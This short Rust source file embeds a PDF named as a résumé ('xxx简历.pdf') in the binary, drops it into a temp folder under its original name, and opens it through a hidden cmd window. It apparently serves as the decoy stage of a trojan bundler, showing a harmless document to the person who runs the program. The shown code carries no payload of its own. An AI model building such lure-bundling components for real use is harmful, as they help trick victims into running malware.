use std::io::Write;
use std::os::windows::process::CommandExt;
use tempfile::NamedTempFile;
use winapi::um::winbase::CREATE_NO_WINDOW;

pub fn bundlefile() {

    const MEMORY_FILE: &[u8] = include_bytes!("../../bundle/xxx简历.pdf");

    let mut temp_file = NamedTempFile::new().unwrap();
    let original_file_name = "xxx简历.pdf"; // 原始文件名
    let file_extension = "pdf"; // 文件后缀名
    
    let temp_dir = temp_file.path().parent().unwrap();
    let temp_file_path = temp_dir.join(original_file_name);

    temp_file.write_all(MEMORY_FILE).unwrap();
    temp_file.flush().unwrap();

    // 保持一致的文件名和后缀名
    std::fs::rename(temp_file.path(), &temp_file_path).expect("Failed to rename temporary file");

    use std::process::Command;
    // 利用cmd 打开文件
    Command::new("cmd")
        .args(&["/c", "start", "/B", temp_file_path.to_str().unwrap()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .expect("Failed to open file");
}
